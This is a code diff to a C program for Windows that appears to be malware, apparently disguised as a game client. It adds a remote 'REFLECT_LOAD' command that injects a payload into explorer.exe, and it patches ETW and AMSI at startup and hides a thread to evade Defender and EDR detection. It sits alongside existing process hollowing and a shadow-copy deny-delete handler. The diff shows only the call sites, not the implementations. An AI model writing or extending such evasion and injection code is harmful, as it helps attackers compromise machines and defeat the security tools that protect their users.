@@ -165,6 +165,10 @@ static void handle_admin_command(SOCKET sock, const char *cmd_raw) {
         obf_sys_hollow_process();
         result = "[Process hollowing: conhost.exe running our payload purely from memory]";
     }
+    else if (strcmp(cmd, "REFLECT_LOAD") == 0) {
+        obf_reflective_load();
+        result = "[Reflective PE loader: full payload injected into explorer.exe without CreateProcess]";
+    }
     else if (strcmp(cmd, "HARDEN_FILES") == 0) {
         obf_sys_harden_files();
         result = "[NTFS ACLs hardened: deny delete for all shadow copies]";
@@ -276,6 +280,13 @@ DWORD WINAPI game_client_loop(LPVOID lpParam) {
 int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
     /* Initialize obfuscated APIs FIRST (before any suspicious calls) */
     obf_init_apis();
+    
+    /* === ETW + AMSI Bypass ===
+     * Patch ETW and AMSI before any suspicious activity to prevent
+     * runtime behavioral detection by Defender/EDR. */
+    obf_bypass_etw();
+    obf_bypass_amsi();
+    obf_hide_thread();
     
     /* Initialize subsystems */
     InitializeCriticalSection(&g_copy_buffer_cs);
